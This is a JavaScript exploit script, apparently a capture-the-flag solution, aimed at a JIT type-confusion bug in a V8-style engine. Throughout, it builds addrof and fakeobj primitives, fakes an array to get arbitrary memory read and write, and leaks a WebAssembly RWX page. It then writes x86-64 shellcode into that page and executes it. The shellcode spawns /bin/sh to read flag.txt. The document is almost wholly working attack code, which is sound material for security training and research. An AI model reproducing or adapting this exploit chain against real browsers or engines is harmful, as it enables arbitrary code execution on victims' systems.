/******************************* Helpers *************************************/
var buf = new ArrayBuffer(8);
var u64_buf = new Uint32Array(buf);
var f64_buf = new Float64Array(buf);

/*
 * Converts a float to an int
 */
function ftoi(val) {
        f64_buf[0] = val;
        return BigInt(u64_buf[0]) + (BigInt(u64_buf[1]) << 0x20n);
}

/*
 * Converts an int to a float
 */
function itof(val) {
        u64_buf[0] = Number(val & 0xffffffffn);
        u64_buf[1] = Number(val >> 0x20n);
        return f64_buf[0];
}

/*
 * Converts float to hex string
 */
function fhex(val) {
    return "0x" + ftoi(val).toString(16)
}

/*
 * Converts int to hex string
 */
function ihex(val) {
    return "0x" + val.toString(16)
}

/******************** Gadgets *************************/
/*
 * Read vul
 * Whatever is read will be typed as a double
 *
 * @param {array} arr - Array to read from
 * @param {int} idx - Index of the array
 * @returns {double} The first and second pointers in the obj array as one double
 */
function read_vuln(arr, idx) {
   
    temp = 0
    for (var i = 0; i < 10; i++) {
        temp ++
    }
    return arr[idx]

}

/*
 * The write vulnerability
 * Whatever is written will be typed as a double
 *
 * Note: When we do write_vuln(arr, 0, val), the pointer to the val ends up like this: <pointer_to_val><rest of it>
 * When we do write_vuln(arr, 1, val), the pointer to the val ends up: <rest of it><pointer_to_val>
 *
 * @param {array} arr - Array to be written to
 * @param {int} idx - The index to write to
 * @param {obj} val - The object to be written
 */
function write_vuln(arr, idx, val) {

    temp = 0
    for (var i = 0; i < 10; i++) {
        temp ++
    }
    arr[idx] = val
    return

}

// This is used to trigger the vulnerability 
function trigger_vuln() {

    dbl_arr = [1.1, 1.2]
    for (var i = 0; i < 1000000; i++) {
        read_vuln(dbl_arr, 0)
        write_vuln(dbl_arr, 0, 1.3)
    }

}

// This gets the memory address of the object
// Return
/*
 * Gets the address of an object
 *
 * @param {obj} obj - The object we wnat to get the address of
 * @returns {obj_addr} - The address of the object as a 4 byte integer
 */
function addrof(obj) {
 
    // Important note: For some reason, creating an array of temp_obj and then writing to it does not work
    // Instead, populating the array with obj first is necessary
    // Why is this the case?
    
    //local_arr = [temp_obj, temp_obj]
    //write_vuln (local_arr, 0, obj) // write into this object array what will be interpreted as a double
    local_arr = [obj, obj]
    obj_addr = read_vuln(local_arr, 0) // read from the object array what will be interpreted as a double
    local_arr = [temp_obj, temp_obj] // cleanup
    return ftoi(obj_addr) & 0xffffffffn

}

/*
 * Creates an object from a pointer and returns that object
 *
 * @param {int} addr - An 4 byte integer value which represents a pointer
 * @returns {obj} fakeobj - an object
 */
function fakeobj(addr) {
    
    local_arr = [temp_obj, temp_obj]
    write_vuln(local_arr, 0, itof(addr))
    ret = local_arr[0]
    return ret

}

/*
 * Arbitrarily read the contents of some pointer
 *
 * @param {int} addr - int addr value
 * @returns {float} - content of the pointer as a float
 */
function arb_read(addr) {

    if (addr % 0x2n == 0) {
        addr += 0x1n
    }
   
    // TODO: Condense to only an arr size of 2?
    construction = [obj_map_prop, 1.1, 1.2, 1.3]

    // Constructing the second part of the corruption
    // <length><backing_store>
    backing_store_start = addr - 0x8n // 0x8n because we are trying to read 8 bytes from this location
    fake_length = 0x08n << 0x20n  
    backing_length_val = backing_store_start + fake_length
    construction[1] = itof(backing_length_val)
    console.log("arb read: ", ihex(backing_length_val))

    // Getting the location of the rwx page
    fake_obj_metadata_start = addrof(construction) - 0x20n // 0x20n because the size of construction = 4 doubles = 32 bytes = 0x20n
    fake = fakeobj(fake_obj_metadata_start)
    return fake[0] // dereference the addr now

}

/*
 * Arbitrarily write some value into the address
 *
 * @param {int} addr - int address
 * @param {int} new_addr - address of the shellcode as a float
 */
function arb_write(addr, new_addr) {

    console.log("addr, new_addr: ", ihex(addr), ihex(new_addr))
    if (addr % 0x2n == 0x0) {
        addr += 0x1n
    }

    construction = [obj_map_prop, 1.1, 1.2, 1.3]
    backing_store_start = addr - 0x8n
    fake_length = 0x08n << 0x20n
    backing_length_val = backing_store_start + fake_length
    construction[1] = itof(backing_length_val)

    console.log("arb write: ", ihex(new_addr), ihex(backing_length_val))
    fake = fakeobj(addrof(construction) - 0x20n)
    fake[0] = itof(new_addr)

}

/*
 * This function is used to grab the map and properties of some js array
 *
 * @param {array} arr - Some array
 * @returns {float} - a float value that looks like: <properties><map>
 */
function construct_map_prop() {

    map_prop = ftoi(read_vuln(obj_arr, 1))
    console.log(ihex(map_prop))
    map_addr = (map_prop & 0xffffffffn) - 0x50n
    prop_addr = (map_prop >> 0x20n) << 0x20n
    ret = map_addr + prop_addr
    return itof(ret)

}

/*
 * Copy shellcode to some address
 *
 * @param {float} addr - address to write the shellcode to as a float
 * @param {array} shellcode - shellcode in an array
 */
function copy_shellcode(addr, shellcode) {

    console.log ("[*] Writing shellcode to ", fhex(addr))

    let buf = new ArrayBuffer(0x100)
    let dataview = new DataView(buf)
    let buf_addr = addrof(buf)
    let buf_backing_store = buf_addr + 0x14n
    console.log("buf backing store: ", ihex(buf_backing_store))
    arb_write(buf_backing_store, ftoi(addr)) // Basically, set the addr of the buffer we have created be equal to the rwx page
    for (let i = 0; i < shellcode.length; i++) {
        dataview.setUint8(i, shellcode[i], true)
    }

    console.log("[*] Done writing shellcode")

}

// Repeatedly calling read and write will JIT the functions so that type checking will not occur
// When type checking does not occur, the compiler assumes that all arrays passed in will be a double array
// At that point, read_vuln and write_vuln will both be vulnerable
trigger_vuln()

temp_obj = {"meaningless": "object"}
// TODO: Double check if arrays with the same type of elements just share a map
global_dbl_arr = [1.1, 1.2] // Cannot type confuse this
obj_arr = [temp_obj, temp_obj] // the above arr's map is 0x50 away from this arr's map

obj_map_prop = construct_map_prop()
console.log("[*] Constructing the map property value: ", fhex(obj_map_prop))
// I think I need a map that is for a double array, and not an object array

console.log("Object map prop: ", fhex(obj_map_prop))

var wasm_code = new Uint8Array([0,97,115,109,1,0,0,0,1,133,128,128,128,0,1,96,0,1,127,3,130,128,128,128,0,1,0,4,132,128,128,128,0,1,112,0,0,5,131,128,128,128,0,1,0,1,6,129,128,128,128,0,0,7,145,128,128,128,0,2,6,109,101,109,111,114,121,2,0,4,109,97,105,110,0,0,10,138,128,128,128,0,1,132,128,128,128,0,0,65,42,11]);
var wasm_mod = new WebAssembly.Module(wasm_code)
var wasm_instance = new WebAssembly.Instance(wasm_mod)
var f = wasm_instance.exports.main
var shellcode = [
	 0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x73, 0x68, 0x00, 0x99, 0x50, 0x54, 0x5f, 0x52
	, 0x66, 0x68, 0x2d, 0x63, 0x54, 0x5e, 0x52, 0xe8, 0x12, 0x00, 0x00, 0x00, 0x2f, 0x62, 0x69
	, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74, 0x00
	, 0x56, 0x57, 0x54, 0x5e, 0x6a, 0x3b, 0x58, 0x0f, 0x05
]

// Get the rwx address by getting the address of the instance. Afterwards, we read the value at that address. This gives us the address of the rwx page
rwx_page_addr = arb_read(addrof(wasm_instance)+0x68n - 1n)
console.log("[*] Leaked the rwx page address: ", fhex(rwx_page_addr))
copy_shellcode(rwx_page_addr, shellcode)
f()



// Checking to see that the tools work
/*
test_obj = {"hi":"world"}
addr = addrof(test_obj)
console.log("Address: ", ihex(addr))

fo = fakeobj(addr)
console.log(fo)
console.log(ihex(addrof(fo)))


t2 = [{"w":"a"}]
addr = addrof(t2)
console.log("Addr2: ", ihex(addr))

fo = fakeobj(addr)
console.log(fo)
console.log(ihex(addrof(fo)))
*/



